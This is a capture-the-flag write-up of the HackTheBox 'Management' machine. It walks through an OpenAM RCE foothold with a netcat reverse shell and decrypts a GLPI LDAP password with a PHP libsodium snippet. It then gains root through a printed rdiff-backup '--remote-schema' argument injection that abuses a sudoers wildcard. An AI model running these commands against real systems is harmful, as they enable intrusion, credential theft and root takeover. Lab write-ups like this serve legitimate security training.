# HackTheBox — Management

| | |
|---|---|
| **Platform** | HackTheBox |
| **Difficulty** | Easy |
| **OS** | Linux (host `management`) |

## Overview

```
OpenAM 16.0.5 SSO → RCE (CVE-2026-33439) → service shell → GLPI DB creds →
libsodium decrypt (glpicrypt.key) → owen's password → SSH (user) →
sudo rdiff-backup (--remote-schema injection) → /root → id_ed25519 → root
```

## 1. Recon

Exposed services: **22** (SSH), **80** (HTTP), **443** (HTTPS). Nmap reveals the virtual hosts `management.htb` and `sso.management.htb` — add both to `/etc/hosts`.

## 2. Web enumeration

- `management.htb` is a static landing page with nothing useful.
- The "Client login" link redirects to `sso.management.htb`, an **OpenAM** login portal. Default credentials fail.
- The page source leaks the version: **OpenAM 16.0.5**.

## 3. Foothold — OpenAM RCE

- OpenAM 16.0.5 maps to **CVE-2026-33439** (advisory `GHSA-2cqq-rpvq-g5qj`).
- Public PoC: `infernosalex/CVE-2026-33439-Python-PoC`.
- The payload is a named-pipe reverse shell (`mkfifo` + `nc`); catch it with a `nc` listener on your `tun0` IP.
- Stabilise the shell:
  ```bash
  python3 -c 'import pty; pty.spawn("/bin/bash")'
  # Ctrl-Z
  stty raw -echo; fg
  ```

## 4. Post-exploitation enumeration

- LinPEAS (run from `/tmp`) flags **GLPI** and **OpenAM** config files under `/opt`.
- **MySQL** is listening locally on `127.0.0.1:3306`.

## 5. Credential harvesting (GLPI)

- The GLPI config under `/opt/glpi/config` holds the database credentials (DB `glpidb`, user `glpi`).
- Interesting tables: `glpi_users`, `glpi_authldaps`, `glpi_authmails`, `glpi_mailcollectors`.
- `glpi_authldaps` has a **"Management Directory"** entry with an **encrypted** bind password.
- GLPI encrypts these values with **libsodium XChaCha20-Poly1305**. The 52-byte blob splits into a 24-byte nonce followed by the ciphertext + MAC.

## 6. Decrypt → owen's password

- The key lives at `/opt/glpi/config/glpicrypt.key`.
- Recover the plaintext with a short PHP one-liner (logic mirrors `GLPIKey.php`, branch 11.0 of the glpi-project repo):
  ```php
  <?php
  $key = trim(file_get_contents('/opt/glpi/config/glpicrypt.key'));
  $blob = base64_decode('<ciphertext_from_db>');
  $nonce = substr($blob, 0, 24);
  $cipher = substr($blob, 24);
  echo sodium_crypto_aead_xchacha20poly1305_ietf_decrypt($cipher, '', $nonce, $key), "\n";
  ```
- The recovered password works for **SSH as `owen`** → **user flag**.

## 7. Privilege escalation — rdiff-backup `--remote-schema`

`sudo -l` for owen:

```
(root) NOPASSWD: /usr/bin/rdiff-backup --server --restrict-path /opt/backup --restrict-mode read-only *
```

The target runs **rdiff-backup 2.2.6**, so the remote-schema placeholder is `{h}` (not the older `%s`) and the client uses the `backup` action verb.

**The trick.** The trailing `*` in the sudoers rule lets us append arbitrary arguments. The *host* portion of a remote path (`host::path`) is substituted into `{h}` **unquoted**, so we can smuggle a second `--restrict-path /` that overrides the intended `/opt/backup` (last one wins) — while keeping the exact prefix the sudoers rule requires:

```bash
rdiff-backup \
  --remote-schema 'sudo /usr/bin/rdiff-backup --server --restrict-path /opt/backup --restrict-mode read-only {h}' \
  backup '--restrict-path / --restrict-mode read-only'::/root /tmp/root_backup
```

This mirrors `/root` into `/tmp/root_backup` (now readable as owen), exposing `root.txt` and `.ssh/id_ed25519`. Log in with the key:

```bash
ssh -i id_ed25519 root@<target>   # uid=0(root)
```

## Lessons

- `--remote-schema` is argument/command injection whenever the `{h}`/host field is unsanitised; combined with a wildcard in sudoers it's a clean root.
- Mind the binary version before building the payload: `%s` (rdiff-backup 1.x) vs `{h}` (2.x).
- Recurring pattern: an encrypted secret in a DB + its key on disk + the app's own source showing how to decrypt it.

## References

- Base writeup: <https://hackmd.io/@tranmanhtan/H1W_mzTFzx>
- rdiff-backup docs / GTFOBins — `--remote-schema`
